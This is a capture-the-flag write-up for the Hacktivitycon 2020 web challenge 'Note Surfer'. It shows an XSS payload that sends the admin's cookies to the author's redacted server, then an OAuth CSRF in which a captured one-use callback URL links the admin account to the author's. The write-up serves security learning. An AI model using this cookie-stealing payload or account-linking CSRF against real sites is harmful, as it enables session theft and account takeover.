---
title: Note Surfer
date: 2020-12-29
excerpt: "'Note Surfer' was a challenge in the Web category of Hacktivitycon"
classes: wide
categories: Hacktivitycon2020
tags:
  - hacktivitycon
  - CSRF
  - XSS
  - web
---

![img](/assets/images/ctf/hacktivitycon-web-notesurfer/0.png)


![img](/assets/images/ctf/hacktivitycon-web-notesurfer/1.png)


Sticky notes app. There's a couple interesting things to note here. Link with OAuth and Report a problem.  

Checking out 'Report a problem' first



![img](/assets/images/ctf/hacktivitycon-web-notesurfer/2.png)


So this got me thinking. If the admin is looking into it, maybe there's some kind of vulnerability on the back end.



I fired up my VPS and started a php session to see if I could steal some cookies



Reported this payload as a problem:



`<img src=x onerror=document.location="http://REDACTED/cookie.php?c="+document.cookie>`



![img](/assets/images/ctf/hacktivitycon-web-notesurfer/3.png)


So XXS is in play, but the cookies are set to HttpOnly. No dice there.



The title of the challenge is a big hint on what to do next:



Cross Site Request Forgery or CSRF (Sea Surf) for short



I assumed that it had something to do with OAuth, so I fired up burp to capture the requests



![img](/assets/images/ctf/hacktivitycon-web-notesurfer/4.png)


Forwarding the first request leaves us with the second.



![img](/assets/images/ctf/hacktivitycon-web-notesurfer/5.png)


After some testing I noted that the 'code' variable is one use. So I set this request to repeater and dropped it.



Right click anywhere on the request and 'Copy URL'



Back on the sticky notes app, we can report another problem



![img](/assets/images/ctf/hacktivitycon-web-notesurfer/6.png)


Send that off and then logging into our OAuth account we can see that we're now connected with the Admin sticky notes account



![img](/assets/images/ctf/hacktivitycon-web-notesurfer/7.png)
